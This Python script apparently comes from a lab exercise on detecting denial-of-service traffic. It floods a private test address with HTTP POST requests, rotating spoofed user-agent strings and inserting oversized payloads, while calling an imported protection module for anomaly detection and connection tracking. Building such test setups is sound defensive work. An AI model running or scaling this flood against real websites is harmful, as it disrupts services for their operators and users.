import requests
import threading
import random
import time
import os
import protection_script  # Import protection mechanisms from protection_script.py

# Target URL for HTTP flood
# target_url = "http://10.0.2.15/real-estate-html-template/index.html"
# num_of_requests = 100

# Define the log file path
LOG_FILE = os.path.join(os.getcwd(), "networkinfo.log")

# List of user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
]


def http_flood(target_url, num_of_requests):
    # Connection tracking
    print("Tracking connections...")
    protection_script.connection_tracking()
    print("\nConnection tracking finished.")

    # Flood the webpage with requests
    for i in range(num_of_requests):
        try:
            # Randomly select a user-agent string
            user_agent = random.choice(user_agents)

            # Generate request size with variation
            request_size = random.randint(100, 300)  # Random size between 100 and 300 bytes

            # Introduce anomaly every 10th request
            if (i + 1) % 10 == 0:
                request_size = random.randint(4000, 7000)  # Anomalous size

            # Check for anomaly
            if protection_script.anomaly_detector.check_anomaly(request_size):
                print(f"Anomaly detected at request {i+1} with size {request_size} bytes")

            # Filter suspicious IP addresses
            if not protection_script.ip_filtering(protection_script.vm_ip, block_for_testing=False):
                # Create a payload with the specified size
                payload = "X" * request_size

                # Send HTTP POST request with payload
                send_request = requests.post(target_url, headers={'User-Agent': user_agent}, data=payload, verify=False)

                # Only print the request status if it was successful (status code 200)
                if send_request.status_code == 200:
                    print(f"Request status: {send_request.status_code}, Size: {request_size} bytes")
        except Exception as e:
            print(f"Error: {str(e)}")

    # Connection tracking
    print("Tracking connections...")
    protection_script.connection_tracking()
    print("\nConnection tracking finsihed.")

if __name__ == "__main__":
    # Target URL for HTTP flood
    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
    num_of_requests = 100

    print(f"Starting HTTP flood, targeting {target_url}")
    protection_script.first_check()
    threading.Thread(target=protection_script.connection_tracking, daemon=True).start()

    http_flood(target_url, num_of_requests)
    print(f"DDoS attack finished.")
